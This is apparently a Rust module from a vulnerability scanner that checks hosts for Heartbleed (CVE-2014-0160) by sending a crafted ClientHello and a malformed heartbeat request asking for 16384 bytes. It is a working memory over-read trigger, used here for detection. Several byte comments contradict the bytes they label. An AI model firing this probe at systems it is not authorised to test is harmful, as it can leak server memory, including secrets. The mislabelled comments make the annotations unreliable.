// CVE-2014-0160 Heartbleed — send malformed TLS heartbeat, check for overread.
// Probe: ClientHello + HeartbeatRequest with length > payload.
// Detection: server echoes back data beyond request boundary.

use crate::engine::{Checker, VulnResult, VulnSeverity};
use async_trait::async_trait;
use std::io::{Read, Write};
use std::net::{IpAddr, SocketAddr, TcpStream};
use std::time::Duration;

pub struct SslHeartbleed;

#[async_trait]
impl Checker for SslHeartbleed {
    fn name(&self) -> &'static str {
        "ssl-heartbleed"
    }
    fn ports(&self) -> &'static [u16] {
        &[443, 465, 636, 993, 995, 8443]
    }

    async fn check(&self, ip: IpAddr, port: u16) -> VulnResult {
        let sa = SocketAddr::new(ip, port);
        let result = tokio::task::spawn_blocking(move || probe(sa)).await;
        match result {
            Ok(true) => VulnResult::vuln(
                "ssl-heartbleed",
                VulnSeverity::Critical,
                "Server leaked memory via malformed heartbeat response",
            )
            .with_cve("CVE-2014-0160"),
            _ => VulnResult::safe("ssl-heartbleed"),
        }
    }
}

fn probe(sa: SocketAddr) -> bool {
    let timeout = Duration::from_secs(5);
    let mut sock = match TcpStream::connect_timeout(&sa, timeout) {
        Ok(s) => s,
        Err(_) => return false,
    };
    sock.set_read_timeout(Some(Duration::from_secs(3))).ok();
    sock.set_write_timeout(Some(Duration::from_secs(3))).ok();

    // Minimal TLS 1.0 ClientHello with heartbeat extension
    let client_hello: &[u8] = &[
        // TLS record: handshake (0x16), TLS 1.0 (0x03 0x01), length
        0x16, 0x03, 0x01, 0x00, 0xdc, // Handshake: ClientHello (1), length
        0x01, 0x00, 0x00, 0xd8, // client_version: TLS 1.2
        0x03, 0x03, // random (32 bytes)
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48,
        0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33,
        0xd4, 0xde, // session_id length = 0
        0x00, // cipher suites length = 66, suites
        0x00, 0x42, 0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00,
        0x88, 0x00, 0x87, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08,
        0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0,
        0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99,
        0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0x00,
        0xff, // compression methods
        0x01, 0x00, // extensions length
        0x00, 0x49, // renegotiation_info ext
        0xff, 0x01, 0x00, 0x01, 0x00, // server_name ext
        0x00, 0x00, 0x00, 0x0e, 0x00, 0x0c, 0x00, 0x00, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68,
        0x6f, 0x73, 0x74, // SessionTicket TLS
        0x00, 0x23, 0x00, 0x00, // ALPN
        0x00, 0x0f, 0x00, 0x01, 0x01, // signature_algorithms
        0x00, 0x0d, 0x00, 0x20, 0x00, 0x1e, 0x06, 0x01, 0x06, 0x02, 0x06, 0x03, 0x05, 0x01, 0x05,
        0x02, 0x05, 0x03, 0x04, 0x01, 0x04, 0x02, 0x04, 0x03, 0x03, 0x01, 0x03, 0x02, 0x03, 0x03,
        0x02, 0x01, 0x02, 0x02, 0x02, 0x03,
        // heartbeat extension (type=0x000f, len=1, mode=peer_allowed_to_send)
        0x00, 0x0f, 0x00, 0x01, 0x01,
    ];

    if sock.write_all(client_hello).is_err() {
        return false;
    }

    // Wait for ServerHello
    let mut buf = [0u8; 1024];
    let mut got_hello = false;
    for _ in 0..10 {
        match sock.read(&mut buf) {
            Ok(n) if n > 0 => {
                // Look for ServerHello (0x16 = handshake)
                if buf[0] == 0x16 {
                    got_hello = true;
                }
                if buf[0] == 0x14 {
                    break;
                } // ChangeCipherSpec — stop
            }
            _ => break,
        }
    }
    if !got_hello {
        return false;
    }

    // Send malformed HeartbeatRequest: payload_length=1 but actual payload=0
    // This asks server to echo back 1 byte from its memory
    let heartbeat: &[u8] = &[
        0x18, // content_type: heartbeat
        0x03, 0x02, // TLS 1.1
        0x00, 0x03, // record length = 3
        0x01, // HeartbeatMessageType: request
        0x40, 0x00, // payload_length = 16384 (way more than we sent)
    ];
    if sock.write_all(heartbeat).is_err() {
        return false;
    }

    // Read response — vulnerable server echoes back data
    let mut resp = [0u8; 65536];
    match sock.read(&mut resp) {
        Ok(n) if n > 3 => {
            // Response is heartbeat type (0x18) and has data beyond the 3-byte payload
            resp[0] == 0x18 && n > 8
        }
        _ => false,
    }
}
